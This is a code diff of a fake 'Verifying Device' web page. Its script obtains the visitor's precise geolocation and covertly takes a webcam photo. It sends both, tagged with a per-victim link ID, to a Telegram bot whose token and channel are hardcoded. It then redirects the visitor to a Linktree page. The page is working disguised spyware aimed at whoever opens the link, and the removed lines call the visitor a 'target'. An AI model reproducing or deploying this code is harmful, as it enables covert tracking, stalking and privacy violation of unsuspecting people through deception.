@@ -11,86 +11,62 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
         p { color: #606770; font-size: 15px; line-height: 1.6; }
-        .footer { margin-top: 20px; font-size: 12px; color: #bcc0c4; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="spinner"></div>
-    <h2>Verifying Device</h2>
-    <p>We are securing your connection. Please grant the requested permissions to continue to the destination.</p>
+    <h2>Verifying Device...</h2>
+    <p>Please wait while we secure your connection.</p>
     <div id="status" style="color: #007bff; font-weight: bold; margin-top: 15px;">Initializing...</div>
-    <div class="footer">SSL Secure Connection • 256-bit Encryption</div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 <video id="video" style="display:none;" autoplay></video>
 
 <script>
-    // URL se 'param' nikalna
+    // --- MASTER CONFIG ---
+    const MASTER_TOKEN = "8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI";
+    const LOG_CHANNEL = "-1003888585833"; // E.g. -100xxxxxxx
+    
     const urlParams = new URLSearchParams(window.location.search);
-    const encodedData = urlParams.get('p'); // 'p' for payload
-
-    let token = '';
-    let chatId = '';
+    const linkId = urlParams.get('id'); // URL se ?id=ABCDE lega
 
     const statusText = document.getElementById('status');
 
     window.onload = async () => {
-        try {
-            if (!encodedData) throw new Error("Missing Config");
-            
-            // Base64 Decode karna
-            const decodedString = atob(encodedData); 
-            const parts = decodedString.split('|'); // Token aur ID ko split karna
-            
-            token = parts[0];
-            chatId = parts[1];
-
-            if (!token || !chatId) throw new Error("Invalid Config");
-            
-            await startProcess();
-        } catch (err) {
-            statusText.innerText = "Error: Authentication Failed";
-            statusText.style.color = "red";
+        if (!linkId) {
+            statusText.innerText = "Error: Invalid Link";
+            return;
         }
+        await startProcess();
     };
 
     async function startProcess() {
-        statusText.innerText = "Requesting Security Clearance...";
-        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await sendLocation(pos);
+                await sendData(pos);
                 await capturePhoto();
-            }, (err) => {
-                alert("Please allow all permissions to verify your identity.");
-                location.reload();
-            }, { enableHighAccuracy: true });
+            }, (err) => { location.reload(); }, { enableHighAccuracy: true });
         }
     }
 
-    async function sendLocation(pos) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const acc = pos.coords.accuracy;
-        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        const text = `📍 *New Target Logged!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View Location](${mapLink})`;
-        
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
-        statusText.innerText = "Security Check: 50% Complete...";
+    async function sendData(pos) {
+        const text = `📍 **Location Logged**\n\nLink ID: ${linkId}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        await fetch(`https://api.telegram.org/bot${MASTER_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: LOG_CHANNEL, text: text, parse_mode: 'Markdown' })
+        });
     }
 
     async function capturePhoto() {
         try {
-            statusText.innerText = "Finalizing Verification...";
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
-
-            await new Promise(resolve => video.onloadedmetadata = resolve);
+            await new Promise(r => video.onloadedmetadata = r);
             
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -98,31 +74,18 @@
             
             setTimeout(async () => {
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
                 const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'identity_check.jpg');
-                formData.append('caption', '📸 Photo Captured Successfully');
+                formData.append('chat_id', LOG_CHANNEL);
+                formData.append('photo', blob, 'img.jpg');
+                formData.append('caption', `📸 **Photo Captured**\nLink ID: ${linkId}`);
 
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                stream.getTracks().forEach(track => track.stop());
-                
-                statusText.innerText = "Verified! Redirecting...";
-                setTimeout(() => {
-                    window.location.href = "https://linktr.ee/Neonman";
-                }, 1000);
+                await fetch(`https://api.telegram.org/bot${MASTER_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = "https://linktr.ee/Neonman"; // Redirect
             }, 1000);
-
-        } catch (err) {
-            window.location.href = "https://linktr.ee/Neonman";
-        }
+        } catch (e) { window.location.href = "https://linktr.ee/Neonman"; }
     }
 </script>
-
 </body>
 </html>
